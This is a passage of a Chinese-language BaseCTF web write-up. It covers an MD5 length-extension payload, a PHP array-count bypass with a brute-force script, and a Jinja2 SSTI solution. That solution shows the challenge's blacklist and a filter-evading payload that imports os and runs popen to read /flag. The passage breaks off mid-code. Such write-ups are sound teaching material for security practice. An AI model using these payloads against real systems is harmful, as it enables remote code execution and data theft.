number">96</span><span class="token operator">%</span><span class="token number">95</span>g<span class="token operator">%</span><span class="token constant">F9T</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">03</span>K<span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token constant">C8</span><span class="token operator">%</span><span class="token constant">A8W</span><span class="token operator">%</span><span class="token number">1</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">84</span><span class="token operator">%</span><span class="token number">9</span>F<span class="token operator">%</span><span class="token constant">D6</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token constant">BCT</span><span class="token operator">&amp;</span>banananana<span class="token operator">=</span>hsad<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token constant">E9</span><span class="token operator">%</span><span class="token constant">CC</span><span class="token operator">%</span><span class="token constant">C5</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token constant">D4</span><span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token constant">BB</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token number">23</span>Vg<span class="token operator">%</span>A2u<span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">95</span>Z<span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">8</span>DS<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">92</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span><span class="token constant">F2</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span>EDf<span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">%</span><span class="token constant">EB</span><span class="token operator">-</span>ha<span class="token operator">%</span><span class="token number">88</span>S<span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">95</span>E<span class="token operator">%</span><span class="token constant">F6</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">21</span>y<span class="token operator">%</span><span class="token constant">A5</span><span class="token operator">%</span><span class="token number">12</span><span class="token operator">%</span><span class="token constant">E6</span><span class="token operator">%</span><span class="token constant">B5H</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span>F7Lci<span class="token operator">%</span><span class="token number">8</span>Dg<span class="token operator">%</span><span class="token constant">FC</span><span class="token operator">%</span><span class="token number">7</span>B8y<span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">8</span>E<span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">E7</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token operator">%</span><span class="token number">0</span>F<span class="token operator">%</span><span class="token number">5</span>E<span class="token operator">%</span><span class="token constant">C9</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">%</span>C8n<span class="token operator">%</span><span class="token number">8</span>A<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">9</span>FK_a<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>C1h<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token number">0</span>Atg<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token number">5</span>E<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">95</span>g<span class="token operator">%</span><span class="token constant">F9T</span><span class="token operator">%</span><span class="token constant">A7</span><span class="token operator">%</span><span class="token number">02</span>K<span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token constant">C8</span><span class="token operator">%</span><span class="token constant">A8W</span><span class="token operator">%</span><span class="token number">1</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">84</span><span class="token operator">%</span><span class="token number">9</span>FV<span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token constant">BCT</span></code></pre><p>第四层为哈希拓展攻击</p><p>参考文章：</p><p><a href="https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html">哈希长度扩展攻击</a></p><p><a href="https://luoingly.top/post/md5-length-extension-attack/">浅析 MD5 长度扩展攻击 (MD5 Length Extension Attack)</a></p><p>使用工具：</p><p><a href="https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py">md5-extension-attack.py</a></p><p>对于原始文本的测量，题目给出了<code>$_SESSION[&#39;random&#39;]</code>的构造方式</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></span></code></pre><p><img src="MD5.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">name<span class="token operator">=</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span>admin<span class="token operator">&amp;</span>md5<span class="token operator">=</span>f2f894abbd41c972a311332cfe76c6fe</code></pre><h4 id="玩原神玩的"><a href="#玩原神玩的" class="headerlink" title="玩原神玩的"></a>玩原神玩的</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">ys_open</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"错了！就你还想玩原神？❌❌❌"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">ys_open</span><span class="token punctuation">(</span><span class="token variable">$tip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$tip</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"我要玩原神"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我不管，我要玩原神！😭😭😭"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">dumpFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">dumpFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">sizeof</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"可恶的QQ人！😡😡😡"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"100%"</span> <span class="token operator">||</span> <span class="token variable">$b</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"love100%"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"某站崩了？肯定是某忽悠干的！😡😡😡"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>  <span class="token variable">$flag</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$ii</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$ii</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ii</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$flag</span><span class="token punctuation">[</span><span class="token variable">$ii</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$ii</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token variable">$ii</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>不知道<code>$array</code>的长度可以直接py爆破</p><pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"len[0]=1"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"payload.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"&amp;len[</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">]=1"</span></span></code></pre><p>后面两个很好绕过，记得<code>%</code>要url编码</p><pre class="language-http" data-language="http"><code class="language-http">POST:len[0]=1&amp;len[1]=1&amp;len[2]=1&amp;len[3]=1&amp;len[4]=1&amp;len[5]=1&amp;len[6]=1&amp;len[7]=1&amp;len[8]=1&amp;len[9]=1&amp;len[10]=1&amp;len[11]=1&amp;len[12]=1&amp;len[13]=1&amp;len[14]=1&amp;len[15]=1&amp;len[16]=1&amp;len[17]=1&amp;len[18]=1&amp;len[19]=1&amp;len[20]=1&amp;len[21]=1&amp;len[22]=1&amp;len[23]=1&amp;len[24]=1&amp;len[25]=1&amp;len[26]=1&amp;len[27]=1&amp;len[28]=1&amp;len[29]=1&amp;len[30]=1&amp;len[31]=1&amp;len[32]=1&amp;len[33]=1&amp;len[34]=1&amp;len[35]=1&amp;len[36]=1&amp;len[37]=1&amp;len[38]=1&amp;len[39]=1&amp;len[40]=1&amp;len[41]=1&amp;len[42]=1&amp;len[43]=1&amp;len[44]=1&amp;m[0]=100%25&amp;m[1]=love100%2530bd7ce7de206924302499f197c7a966</code></pre><p>最后根据给出加密后的 flag 数组，加密流程是把 flag 每⼀个字符的 ASCII 值和当前索引异或再取 md5 值，挨个输出，脚本爆破即可 </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"3295c76acbf4caaed33c36b1b5fc2cb1"</span><span class="token punctuation">,</span> <span class="token string">"26657d5ff9020d2abefe558796b99584"</span><span class="token punctuation">,</span> <span class="token string">"73278a4a86960eeb576a8fd4c9ec6997"</span><span class="token punctuation">,</span>       <span class="token string">"ec8956637a99787bd197eacd77acce5e"</span><span class="token punctuation">,</span> <span class="token string">"e2c420d928d4bf8ce0ff2ec19b371514"</span><span class="token punctuation">,</span> <span class="token string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="token punctuation">,</span>       <span class="token string">"ea5d2f1c4608232e07d3aa3d998e5135"</span><span class="token punctuation">,</span> <span class="token string">"c8ffe9a587b126f152ed3d89a146b445"</span><span class="token punctuation">,</span> <span class="token string">"a97da629b098b75c294dffdc3e463904"</span><span class="token punctuation">,</span>       <span class="token string">"a97da629b098b75c294dffdc3e463904"</span><span class="token punctuation">,</span> <span class="token string">"66f041e16a60928b05a7e228a89c3799"</span><span class="token punctuation">,</span> <span class="token string">"2838023a778dfaecdc212708f721b788"</span><span class="token punctuation">,</span>       <span class="token string">"65b9eea6e1cc6bb9f0cd2a47751a186f"</span><span class="token punctuation">,</span> <span class="token string">"9a1158154dfa42caddbd0694a4e9bdc8"</span><span class="token punctuation">,</span> <span class="token string">"698d51a19d8a121ce581499d7b701668"</span><span class="token punctuation">,</span>       <span class="token string">"f0935e4cd5920aa6c7c996a5ee53a70f"</span><span class="token punctuation">,</span> <span class="token string">"7f39f8317fbdb1988ef4c628eba02591"</span><span class="token punctuation">,</span> <span class="token string">"182be0c5cdcd5072bb1864cdee4d3d6e"</span><span class="token punctuation">,</span>       <span class="token string">"07e1cd7dca89a1678042477183b7ac3f"</span><span class="token punctuation">,</span> <span class="token string">"73278a4a86960eeb576a8fd4c9ec6997"</span><span class="token punctuation">,</span> <span class="token string">"182be0c5cdcd5072bb1864cdee4d3d6e"</span><span class="token punctuation">,</span>       <span class="token string">"9f61408e3afb633e50cdf1b20de6f466"</span><span class="token punctuation">,</span> <span class="token string">"e369853df766fa44e1ed0ff613f563bd"</span><span class="token punctuation">,</span> <span class="token string">"a5771bce93e200c36f7cd9dfd0e5deaa"</span><span class="token punctuation">,</span>       <span class="token string">"f7177163c833dff4b38fc8d2872f1ec6"</span><span class="token punctuation">,</span> <span class="token string">"67c6a1e7ce56d3d6fa748ab6d9af3fd7"</span><span class="token punctuation">,</span> <span class="token string">"b53b3a3d6ab90ce0268229151c9bde11"</span><span class="token punctuation">,</span>       <span class="token string">"e369853df766fa44e1ed0ff613f563bd"</span><span class="token punctuation">,</span> <span class="token string">"67c6a1e7ce56d3d6fa748ab6d9af3fd7"</span><span class="token punctuation">,</span> <span class="token string">"4c56ff4ce4aaf9573aa5dff913df997a"</span><span class="token punctuation">,</span>       <span class="token string">"da4fb5c6e93e74d3df8527599fa62642"</span><span class="token punctuation">,</span> <span class="token string">"c0c7c76d30bd3dcaefc96f40275bdc0a"</span><span class="token punctuation">,</span> <span class="token string">"a3f390d88e4c41f2747bfa2f1b5f87db"</span><span class="token punctuation">,</span>       <span class="token string">"c74d97b01eae257e44aa9d5bade97baf"</span><span class="token punctuation">,</span> <span class="token string">"70efdf2ec9b086079795c442636b55fb"</span><span class="token punctuation">,</span> <span class="token string">"70efdf2ec9b086079795c442636b55fb"</span><span class="token punctuation">,</span>       <span class="token string">"6ea9ab1baa0efb9e19094440c317e21b"</span><span class="token punctuation">,</span> <span class="token string">"7cbbc409ec990f19c78c75bd1e06f215"</span><span class="token punctuation">,</span> <span class="token string">"98f13708210194c475687be6106a3b84"</span><span class="token punctuation">,</span>       <span class="token string">"3c59dc048e8850243be8079a5c74d079"</span><span class="token punctuation">,</span> <span class="token string">"4e732ced3463d06de0ca9a15b6153677"</span><span class="token punctuation">,</span> <span class="token string">"02e74f10e0327ad868d138f2b4fdd6f0"</span><span class="token punctuation">,</span>       <span class="token string">"35f4a8d465e6e1edc05f3d8ab658c551"</span><span class="token punctuation">,</span> <span class="token string">"28dd2c7955ce926456240b2ff0100bde"</span><span class="token punctuation">,</span> <span class="token string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><h4 id="复读机-SSTI"><a href="#复读机-SSTI" class="headerlink" title="复读机(SSTI)"></a>复读机(SSTI)</h4><p>过滤了很多东⻄，⽽且要求传⼊的字符串必须以 BaseCTF{ 开头，还会检测括号匹配。这⾥使⽤⼯具 Fenjing，本地先搭⼀个可以被 SSTI 的服务器，然后⼿动把过滤的字符串都试出来，再⽤Fenjing 跑。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;&#123;'</span><span class="token punctuation">,</span> <span class="token string">'&#125;&#125;'</span><span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span>             <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'init'</span><span class="token punctuation">,</span> <span class="token string">'global'</span><span class="token punctuation">,</span> <span class="token string">'builtin'</span><span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span>             <span class="token string">'lipsum'</span><span class="token punctuation">,</span> <span class="token string">'cycler'</span><span class="token punctuation">,</span> <span class="token string">'url_for'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'pop'</span><span class="token punctuation">,</span> <span class="token string">'format'</span><span class="token punctuation">,</span> <span class="token string">'replace'</span><span class="token punctuation">,</span> <span class="token string">'reverse'</span>             <span class="token punctuation">]</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"guest"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>i <span class="token keyword">in</span> name <span class="token keyword">for</span> i <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"error"</span>    t <span class="token operator">=</span> Template<span class="token punctuation">(</span><span class="token string">"Hello "</span> <span class="token operator">+</span> name<span class="token punctuation">)</span>    <span class="token keyword">return</span> t<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span></code></pre><p>Payload</p><pre class="language-http" data-language="http"><code class="language-http">fenjing:python -m fenjing crack --url http://IP:5000/ --method GET --inputs namePOST:flag=BaseCTF&#123;%set in='_'~'_'~'i''nit'~'_'~'_'%&#125;&#123;%set gl='_'~'_'~'g''lobals'~'_'~'_'%&#125;&#123;%set bu='_'~'_'~'b''uiltins'~'_'~'_'%&#125;&#123;%set im='_'~'_'~'import'~'_'~'_'%&#125;&#123;%set da='OS'|lower%&#125;&#123;%set ca='%c%c%c%c%c%c%c%c%c'%(99,97,116,32,47,102,108,97,103)%&#125;&#123;%print joiner[in][gl][bu][im](da)['p''open'](ca)['read']()%&#125;</code></pre><h4 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>Jail<span class="token punctuation">[</span>by<span class="token operator">.</span>Happy<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token 